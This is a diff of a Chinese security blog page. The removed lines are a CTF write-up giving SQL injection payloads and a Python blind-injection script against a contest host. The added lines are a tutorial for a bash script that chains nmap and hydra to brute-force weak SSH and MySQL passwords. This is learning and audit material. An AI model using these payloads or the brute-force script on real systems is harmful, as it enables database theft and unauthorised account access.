@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="ctf," />
+  <meta name="keywords" content="Linux Shell," />
 
 
 
@@ -79,18 +79,21 @@
 
 
 
-<meta name="description" content="题目:Some Words事先不知道有这个比赛，同学在群里发的链接，正好是自己感兴趣的注入，抱着学习的心态借同学的号做了一下 进入题目链接，很明显是道注入题，先fuzz了一下，大致过滤了部分关键字如下: &amp;#39;,and,union,where,=,updatexml,rand,group_concat等 一看就是黑名单过滤，虽然过滤了很多关键字，但是很容易绕过，在这我说两种注入方法: 报错注入">
-<meta name="keywords" content="ctf">
+<meta name="description" content="用shell写一个自动化扫描主机端口爆破服务弱口令的脚本序最近在学习linux shell脚本的编写，学会写shell的一个好处就是能够批量执行我们要执行的命令，实现自动化工作，可以在今后的工作中提升工作效率，节省时间 需求假设现在有一个需求，公司分配给你了一个ip列表，要求你将其中存活的主机筛选出来，检查这些主机是否开启了常用的服务，以及是否存在弱口令 一般常用的做法就是先利用nmap扫描出存活">
+<meta name="keywords" content="Linux Shell">
 <meta property="og:type" content="article">
-<meta property="og:title" content="第三届上海市大学生网络安全大赛注入题writeup">
-<meta property="og:url" content="http://yoursite.com/2017/11/05/Some Words/index.html">
+<meta property="og:title" content="用shell写一个自动化扫描主机端口爆破服务弱口令的脚本">
+<meta property="og:url" content="http://yoursite.com/2018/05/14/autobrute/index.html">
 <meta property="og:site_name" content="Lawliet Blog">
-<meta property="og:description" content="题目:Some Words事先不知道有这个比赛，同学在群里发的链接，正好是自己感兴趣的注入，抱着学习的心态借同学的号做了一下 进入题目链接，很明显是道注入题，先fuzz了一下，大致过滤了部分关键字如下: &amp;#39;,and,union,where,=,updatexml,rand,group_concat等 一看就是黑名单过滤，虽然过滤了很多关键字，但是很容易绕过，在这我说两种注入方法: 报错注入">
+<meta property="og:description" content="用shell写一个自动化扫描主机端口爆破服务弱口令的脚本序最近在学习linux shell脚本的编写，学会写shell的一个好处就是能够批量执行我们要执行的命令，实现自动化工作，可以在今后的工作中提升工作效率，节省时间 需求假设现在有一个需求，公司分配给你了一个ip列表，要求你将其中存活的主机筛选出来，检查这些主机是否开启了常用的服务，以及是否存在弱口令 一般常用的做法就是先利用nmap扫描出存活">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-11-05T12:54:31.333Z">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180514/HKF6Jl6Jdl.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180514/Ca7L5i0dGI.png?imageslim">
+<meta property="og:updated_time" content="2018-05-14T08:47:23.374Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="第三届上海市大学生网络安全大赛注入题writeup">
-<meta name="twitter:description" content="题目:Some Words事先不知道有这个比赛，同学在群里发的链接，正好是自己感兴趣的注入，抱着学习的心态借同学的号做了一下 进入题目链接，很明显是道注入题，先fuzz了一下，大致过滤了部分关键字如下: &amp;#39;,and,union,where,=,updatexml,rand,group_concat等 一看就是黑名单过滤，虽然过滤了很多关键字，但是很容易绕过，在这我说两种注入方法: 报错注入">
+<meta name="twitter:title" content="用shell写一个自动化扫描主机端口爆破服务弱口令的脚本">
+<meta name="twitter:description" content="用shell写一个自动化扫描主机端口爆破服务弱口令的脚本序最近在学习linux shell脚本的编写，学会写shell的一个好处就是能够批量执行我们要执行的命令，实现自动化工作，可以在今后的工作中提升工作效率，节省时间 需求假设现在有一个需求，公司分配给你了一个ip列表，要求你将其中存活的主机筛选出来，检查这些主机是否开启了常用的服务，以及是否存在弱口令 一般常用的做法就是先利用nmap扫描出存活">
+<meta name="twitter:image" content="http://p008biu9n.bkt.clouddn.com/blog/180514/HKF6Jl6Jdl.png?imageslim">
 
 
 
@@ -120,13 +123,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2017/11/05/Some Words/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/05/14/autobrute/"/>
 
 
 
 
 
-  <title>第三届上海市大学生网络安全大赛注入题writeup | Lawliet Blog</title>
+  <title>用shell写一个自动化扫描主机端口爆破服务弱口令的脚本 | Lawliet Blog</title>
   
 
 
@@ -253,7 +256,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/05/Some Words/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/14/autobrute/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Lawliet">
@@ -270,7 +273,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">第三届上海市大学生网络安全大赛注入题writeup</h1>
+          <h1 class="post-title" itemprop="name headline">用shell写一个自动化扫描主机端口爆破服务弱口令的脚本</h1>
         
 
         <div class="post-meta">
@@ -282,8 +285,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-05T20:54:31+08:00">
-                2017-11-05
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-14T16:36:34+08:00">
+                2018-05-14
               </time>
             
 
@@ -305,8 +308,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web安全/" itemprop="url" rel="index">
-                    <span itemprop="name">web安全</span>
+                  <a href="/categories/Linux-Shell/" itemprop="url" rel="index">
+                    <span itemprop="name">Linux Shell</span>
                   </a>
                 </span>
 
@@ -342,111 +345,45 @@
       
 
       
-        <h1 id="题目-Some-Words"><a href="#题目-Some-Words" class="headerlink" title="题目:Some Words"></a>题目:Some Words</h1><p>事先不知道有这个比赛，同学在群里发的链接，正好是自己感兴趣的注入，抱着学习的心态借同学的号做了一下</p>
-<p>进入题目链接，很明显是道注入题，先fuzz了一下，大致过滤了部分关键字如下:</p>
-<p><code>&#39;,and,union,where,=,updatexml,rand,group_concat等</code></p>
-<p>一看就是黑名单过滤，虽然过滤了很多关键字，但是很容易绕过，在这我说两种注入方法:</p>
-<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>虽然过滤了updatexml,rand等报错注入关键字,但是没有过extractvalue<br>,过滤了and,可以用or代替，过滤了=可以用like代替,所以可以构造payload:</p>
-<p><code>?id=1 or extractvalue(1,concat(0x3a,database(),0x3a))--+</code>,</p>
-<p>用extractvalue函数的特性报错爆出当前数据库名为<code>words</code>，该报错原理是因为extractvalue函数的第二个参数必须为XPATH格式的，但是concat连接函数返回的是字符串，格式不符合，所以报错并显示出该字符串的内容，接下来构造payload:</p>
-<p><code>?id=1 or extractvalue(1,concat(0x3a,(select table_name from information_schema.tables where table_schema like database() limit 0,1),0x3a))--+</code></p>
-<p>爆出words数据库下的第一个表名为<code>f14g</code>,用双引号代替单引号继续构造payload:</p>
-<p><code>?id=1 or extractvalue(1,concat(0x3a,(select column_name from information_schema.columns where table_name like &quot;f14g&quot; limit 0,1),0x3a))--+</code></p>
-<p>爆出f14g表下存在一个名为f14g的列名,于是构造payload:</p>
-<p><code>?id=1 or extractvalue(1,concat(0x3a,(select f14g from f14g),0x3a))--+</code></p>
-<p>发现这个payload是不完整的,显示的是前31个字节,我们查一下长度:</p>
-<p><code>?id=1 or extractvalue(1,concat(0x3a,(select length(f14g) from f14g),0x3a))--+</code></p>
-<p>结果为42</p>
-<p>构造</p>
-<blockquote>
-<p><code>?id=1 or extractvalue(1,concat(0x3a,(select substr(f14g,1,31) from f14g),0x3a))--+</code></p>
-<p><code>?id=1 or extractvalue(1,concat(0x3a,(select substr(f14g,32,42) from f14g),0x3a))--+</code></p>
-</blockquote>
-<p>读取完整f14g:flag{93303476-a738-441b-9800-90719f16eb85}</p>
-<p>注:f14g是随机生成的，每一次做题f14g都不一样</p>
-<h3 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h3><p>过滤了and,我们可以用or(或)或者是^(位异或)进行逻辑判断,贴出我用python写的盲注脚本,代码写得很烂,求大佬们不要喷:</p>
-<pre><code>import requests
-def gettablelen(url):
-    i=1
-    while 1:
-        payload=url+&quot;?id=-1 or (select length(table_name) from information_schema.tables where table_schema like database() limit 0,1) like %d--+&quot;%(i)
-        html=requests.get(url=payload).content
-        if html.find(&quot;Hello Hacker!!&quot;)!=-1:
-            print &quot;table length:%d&quot;%(i)
-            break
-        else:
-            i=i+1
-    return i
-def gettable(url,len):
-    table=&quot;&quot;
-    for i in range(1,len+1):
-        for j in range(255):
-            payload=url+&quot;?id=-1 or ascii(substr((select table_name from information_schema.tables where table_schema like database() limit 0,1),%d,1)) like %d--+&quot;%(i,j)
-            html=requests.get(url=payload).content
-            if html.find(&quot;Hello Hacker!!&quot;)!=-1:
-                print chr(j)
-                table=table+chr(j)
-                break
-    return table
-def getcolumnlen(url,table):
-    i=1
-    while 1:
-        payload=url+&apos;?id=-1 or (select length(column_name) from information_schema.columns where table_name like &quot;%s&quot; limit 0,1) like %d--+&apos;%(table,i)
-        html=requests.get(url=payload).content
-        if html.find(&quot;Hello Hacker!!&quot;)!=-1:
-            print &quot;column length:%d&quot;%(i)
-            break
-        else:
-            i=i+1
-    return i
-def getcolumn(url,len,table):
-    column=&quot;&quot;
-    for i in range(1,len+1):
-        for j in range(255):
-            payload=url+&apos;?id=-1 or ascii(substr((select column_name from information_schema.columns where table_name like &quot;%s&quot; limit 0,1),%d,1)) like %d--+&apos;%(table,i,j)
-            html=requests.get(url=payload).content
-            if html.find(&quot;Hello Hacker!!&quot;)!=-1:
-                print chr(j)
-                column=column+chr(j)
-                break
-    return column
-def getflaglen(url,table,column):
-    i=1
-    while 1:
-        payload=url+&apos;?id=-1 or (select length(%s) from %s limit 0,1) like %d--+&apos;%(column,table,i)
-        html=requests.get(url=payload).content
-        if html.find(&quot;Hello Hacker!!&quot;)!=-1:
-            print &quot;flag length:%d&quot;%(i)
-            break
-        else:
-            i=i+1
-    return i
-def getflag(url,table,column,len):
-    flag=&quot;&quot;
-    for i in range(1,len+1):
-        for j in range(255):
-            payload=url+&apos;?id=-1 or ascii(substr((select %s from %s limit 0,1),%d,1)) like %d--+&apos;%(column,table,i,j)
-            html=requests.get(url=payload).content
-            if html.find(&quot;Hello Hacker!!&quot;)!=-1:
-                print chr(j)
-                flag=flag+chr(j)
-                break
-    return flag
-def main():
-    url=&quot;http://cdb627a8a4974a5f92615994c9e6199abda58b73f6364df1.game.ichunqiu.com/index.php&quot;
-    tlen=gettablelen(url)
-    table=gettable(url,tlen)
-    print table
-    clen=getcolumnlen(url,table)
-    column=getcolumn(url,clen,table)
-    print &quot;%s column is %s&quot;%(table,column)
-    flen=getflaglen(url,table,column)
-    print &quot;flag len:%d&quot;%(flen)
-    flag=getflag(url,table,column,flen)
-    print flag
-if __name__==&apos;__main__&apos;:
-    main()
-</code></pre>
+        <h1 id="用shell写一个自动化扫描主机端口爆破服务弱口令的脚本"><a href="#用shell写一个自动化扫描主机端口爆破服务弱口令的脚本" class="headerlink" title="用shell写一个自动化扫描主机端口爆破服务弱口令的脚本"></a>用shell写一个自动化扫描主机端口爆破服务弱口令的脚本</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>最近在学习linux shell脚本的编写，学会写shell的一个好处就是能够批量执行我们要执行的命令，实现自动化工作，可以在今后的工作中提升工作效率，节省时间</strong></p>
+<h3 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h3><p><strong>假设现在有一个需求，公司分配给你了一个ip列表，要求你将其中存活的主机筛选出来，检查这些主机是否开启了常用的服务，以及是否存在弱口令</strong></p>
+<p><strong>一般常用的做法就是先利用nmap扫描出存活主机，然后扫描这些主机开放的端口，用hydra对这些端口进行弱口令安全检查。如果将这些命令写在一个shell脚本中，以后再次做相同的工作时直接运行我们编写的.sh文件就可以了，这样的话就能大大提高我们的工作效率，避免重复机械的工作，大大提升效率</strong></p>
+<h3 id="编写shell脚本"><a href="#编写shell脚本" class="headerlink" title="编写shell脚本"></a>编写shell脚本</h3><p><strong>我编写的shell脚本有以下几部分组成</strong></p>
+<p><strong>ip.txt</strong></p>
+<pre><code>ip列表，里面放着要扫描的ip
+</code></pre><p><strong>service.conf</strong></p>
+<pre><code>配置文件，里面是我们要检查的服务和其对应的端口号，使用者可以在这里进行设置要检查的服务
+</code></pre><p><strong>比如要检查ssh与mysql服务的弱口令，里面这样写，配置文件格式：<code>端口：服务</code></strong></p>
+<pre><code>22:ssh
+3306:mysql
+</code></pre><p><strong>这样便能灵活的对我们需要的服务进行弱口令检测</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180514/HKF6Jl6Jdl.png?imageslim" alt="mark"></p>
+<p><strong>user.txt</strong></p>
+<pre><code>存放着常见的用户名，用于hydra爆破
+</code></pre><p><strong>passwd.txt</strong></p>
+<pre><code>存放着常见的弱口令，用于hydra爆破
+</code></pre><p><strong>brute.sh</strong></p>
+<pre><code>下面的就是我编写的shell脚本，可以自动化的完成上述的一系列工作
+
+#!/bin/bash
+filename=$1
+for port in `awk -F &apos;:&apos; &apos;{print $1}&apos; service.conf`
+do
+name=`awk -F &apos;:&apos; &apos;/&apos;$port&apos;/{print $2}&apos; service.conf`
+echo &quot;$name weak password result:&quot;
+nmap -sn -iL $filename|awk &apos;/Nmap scan/{print $5}&apos;&gt;liveip.txt
+nmap -Pn -sS -p $port -iL liveip.txt|grep &quot;open&quot; -B &quot;5&quot;|awk &apos;/Nmap scan/{print $5}&apos;&gt;tmpip.txt
+if [ ! -s tmpip.txt ]
+then
+echo &quot;no ip open port $port&quot;
+else
+result=`hydra -L user.txt -P passwd.txt -M tmpip.txt $name -t 4|awk &apos;/password:/{print $0}&apos;`
+echo $result
+fi
+done
+</code></pre><p><strong>首先接收命令行的第一个参数，也就是要进行检查的ip列表文件ip.txt，之后循环读取服务配置文件，使用awk工具筛选出要检查的端口号和其对应的服务并赋值给对应的变量，之后用nmap进行主机存活扫描，将存活主机使用awk匹配出来输出到一个文件中，使用nmap对这个文件里的这些存活ip进行端口扫描，利用awk将nmap扫描结果中开放端口的ip筛选出来输出到一个文件里，之后利用hydra对这些ip进行其端口对应服务的弱口令检查</strong></p>
+<p><strong>脚本运行结果，以自己所在内网的ip作为测试，ip段<code>192.168.3.0/24</code>,可以看出针对ssh服务还是检查出很多弱口令的，mysql服务大多数都禁止了远程连接，所以没有扫出弱口令</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180514/Ca7L5i0dGI.png?imageslim" alt="mark"></p>
+<p><strong>这是初步编写的成果，只是与文件进行交互，而且有着很多的不足，之后随着学习的深入，相信会写出比这个更棒更完善的脚本</strong></p>
+
       
     </div>
     
@@ -463,7 +400,7 @@ if __name__==&apos;__main__&apos;:
       
         <div class="post-tags">
           
-            <a href="/tags/ctf/" rel="tag"># ctf</a>
+            <a href="/tags/Linux-Shell/" rel="tag"># Linux Shell</a>
           
         </div>
       
@@ -476,8 +413,8 @@ if __name__==&apos;__main__&apos;:
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/11/03/github-hexo/" rel="next" title="我的第一篇博客">
-                <i class="fa fa-chevron-left"></i> 我的第一篇博客
+              <a href="/2018/05/13/parse_url/" rel="next" title="php parse_url()函数的漏洞">
+                <i class="fa fa-chevron-left"></i> php parse_url()函数的漏洞
               </a>
             
           </div>
@@ -485,10 +422,6 @@ if __name__==&apos;__main__&apos;:
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/11/08/shadowsocks/" rel="prev" title="科学上网,vultr vps主机上shadowsocks的搭建">
-                科学上网,vultr vps主机上shadowsocks的搭建 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -648,7 +581,7 @@ if __name__==&apos;__main__&apos;:
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#题目-Some-Words"><span class="nav-number">1.</span> <span class="nav-text">题目:Some Words</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#报错注入"><span class="nav-number">1.0.1.</span> <span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bool盲注"><span class="nav-number">1.0.2.</span> <span class="nav-text">bool盲注</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#用shell写一个自动化扫描主机端口爆破服务弱口令的脚本"><span class="nav-number">1.</span> <span class="nav-text">用shell写一个自动化扫描主机端口爆破服务弱口令的脚本</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#序"><span class="nav-number">1.0.1.</span> <span class="nav-text">序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#需求"><span class="nav-number">1.0.2.</span> <span class="nav-text">需求</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#编写shell脚本"><span class="nav-number">1.0.3.</span> <span class="nav-text">编写shell脚本</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
